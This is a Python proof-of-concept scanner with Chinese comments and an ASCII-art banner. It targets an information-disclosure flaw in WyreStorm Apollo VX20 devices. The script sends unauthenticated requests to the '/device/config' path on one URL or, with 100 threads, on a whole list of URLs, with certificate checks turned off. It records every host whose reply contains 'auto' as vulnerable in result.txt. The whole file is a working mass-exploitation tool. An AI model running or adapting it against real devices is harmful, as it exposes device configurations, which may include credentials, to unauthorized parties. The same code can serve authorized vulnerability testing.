import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    '''主函数'''
    banner()            
    parser = argparse.ArgumentParser(description = 'WyreStorm Apollo VX20 信息泄露漏洞')    #实例化对象
    parser.add_argument('-u','--url',help='请输入你要判断的url')        #添加变量，参数
    parser.add_argument('-f','--file',help='请输入你要批量的url')       #添加变量，参数
    agres = parser.parse_args()                                     #实例化
    if agres.url and not agres.file:                        #判断url和文件
        poc(agres.url)                              #如果是url就调用poc
    elif agres.file and not agres.url:              #判断url和文件     
        url_list = []                             #定义列表
        with open (agres.file,'r',encoding='utf-8') as fp:  #以读的方式，utp-8编码打开文件
            for i in fp.readlines():                        
                url_list.append(i.strip().replace('\n',''))     #首尾去空
        mp = Pool(100)                      #定义线程数100
        mp.map(poc, url_list)               #定义线程数
        mp.close()                          #关闭
        mp.join()                            
    else: 
        print(f'usag:\n\t python3 {sys.argv[0]} -h')              #f 格式化输出 usag 用法 \t 制表符   sys.argv[0] 获取脚本文件名

def banner():
    '''横幅'''
    test = """                                                                                                                        

 /$$      /$$                                /$$$$$$   /$$                                      
| $$  /$ | $$                               /$$__  $$ | $$                                      
| $$ /$$$| $$ /$$   /$$  /$$$$$$   /$$$$$$ | $$  \__//$$$$$$    /$$$$$$   /$$$$$$  /$$$$$$/$$$$ 
| $$/$$ $$ $$| $$  | $$ /$$__  $$ /$$__  $$|  $$$$$$|_  $$_/   /$$__  $$ /$$__  $$| $$_  $$_  $$
| $$$$_  $$$$| $$  | $$| $$  \__/| $$$$$$$$ \____  $$ | $$    | $$  \ $$| $$  \__/| $$ \ $$ \ $$
| $$$/ \  $$$| $$  | $$| $$      | $$_____/ /$$  \ $$ | $$ /$$| $$  | $$| $$      | $$ | $$ | $$
| $$/   \  $$|  $$$$$$$| $$      |  $$$$$$$|  $$$$$$/ |  $$$$/|  $$$$$$/| $$      | $$ | $$ | $$
|__/     \__/ \____  $$|__/       \_______/ \______/   \___/   \______/ |__/      |__/ |__/ |__/
              /$$  | $$                                                                         
             |  $$$$$$/                                                                         
              \______/                                                                          
                                                    
                                                                                  version: 1.0.0
                                                                                  author:sis2311@lsk

"""
    print(test)             #打印test


def poc(target):
    '''检测漏洞'''
    url = target + '/device/config'
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    }
    try:
        result = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if 'auto' in result:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+] 存在漏洞 {target} '+'\n')
        else:
            print(f'[-]{target} is not vulabe')
    except:
        print(f'[*]{target} server error')

'''检测漏洞脚本'''
if __name__ == '__main__':
    '''定义主函数'''
    main()